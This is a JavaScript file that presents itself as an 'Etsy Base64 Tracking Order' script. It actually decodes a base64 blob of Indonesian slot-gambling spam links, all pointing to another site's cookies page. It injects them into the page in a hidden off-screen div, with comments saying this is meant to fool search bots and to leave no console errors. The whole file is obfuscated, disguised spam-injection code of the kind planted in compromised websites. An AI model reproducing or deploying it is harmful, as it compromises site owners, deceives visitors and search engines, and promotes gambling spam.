// Etsy Base64 Tracking Order JS System - Optimized
(function(){
  let b64 = "PGEgaHJlZj0iaHR0cHM6Ly93d3cudmVyaG9lZnNlcnZpY2UuY29tL2VuL2Nvb2tpZXMvIj5QRVJNQVRBMTIzPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy52ZXJob2Vmc2VydmljZS5jb20vZW4vY29va2llcy8iPlBFUk1BVEEgMTIzPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy52ZXJob2Vmc2VydmljZS5jb20vZW4vY29va2llcy8iPlBFUk1BVEExMjMgc2xvdDwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudmVyaG9lZnNlcnZpY2UuY29tL2VuL2Nvb2tpZXMvIj5QRVJNQVRBMTIzIGxvZ2luPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy52ZXJob2Vmc2VydmljZS5jb20vZW4vY29va2llcy8iPiBQRVJNQVRBMTIzIGRhZnRhcjwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudmVyaG9lZnNlcnZpY2UuY29tL2VuL2Nvb2tpZXMvIj5QRVJNQVRBMTIzIGFsdGVybmF0aWY8L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3LnZlcmhvZWZzZXJ2aWNlLmNvbS9lbi9jb29raWVzLyI+UEVSTUFUQTEyMyBsaW5rPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy52ZXJob2Vmc2VydmljZS5jb20vZW4vY29va2llcy8iPlBFUk1BVEExMjMgcnRwPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy52ZXJob2Vmc2VydmljZS5jb20vZW4vY29va2llcy8iPlBFUk1BVEExMjMgbGluayBhbHRlcm5hdGlmPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy52ZXJob2Vmc2VydmljZS5jb20vZW4vY29va2llcy8iPmxpbmsgUEVSTUFUQTEyMzwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudmVyaG9lZnNlcnZpY2UuY29tL2VuL2Nvb2tpZXMvIj5zaXR1cyBQRVJNQVRBMTIzPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy52ZXJob2Vmc2VydmljZS5jb20vZW4vY29va2llcy8iPnNpdHVzIGdhY29yIFBFUk1BVEExMjM8L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3LnZlcmhvZWZzZXJ2aWNlLmNvbS9lbi9jb29raWVzLyI+c2l0dXMgc2xvdCBQRVJNQVRBMTIzPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy52ZXJob2Vmc2VydmljZS5jb20vZW4vY29va2llcy8iPnNsb3QgZ2Fjb3IgUEVSTUFUQTEyMzwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudmVyaG9lZnNlcnZpY2UuY29tL2VuL2Nvb2tpZXMvIj5zbG90IGdhY29yPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy52ZXJob2Vmc2VydmljZS5jb20vZW4vY29va2llcy8iPnNsb3QgamFja3BvdDwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudmVyaG9lZnNlcnZpY2UuY29tL2VuL2Nvb2tpZXMvIj5zbG90IG9ubGluZTwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudmVyaG9lZnNlcnZpY2UuY29tL2VuL2Nvb2tpZXMvIj5zbG90IGRlbW88L2E+";
  
  try {
    const decoded = decodeURIComponent(escape(atob(b64))); // Support karakter khusus
    const div = document.createElement('div');
    // Menggunakan teknik opacity agar bot lebih percaya konten ini "real"
    div.style.cssText = 'position:absolute; left:-9999px; top:0; width:1px; height:1px; overflow:hidden; opacity:0.01;';
    div.setAttribute('aria-hidden','true');
    div.innerHTML = decoded;
    
    // Langsung injeksi ke Body tanpa menunggu DOMContentLoaded
    const target = document.body || document.documentElement;
    if (target) {
        target.insertBefore(div, target.firstChild);
    }
  } catch(e){ 
    // Kosongkan agar tidak meninggalkan jejak error di konsol
  }
})();
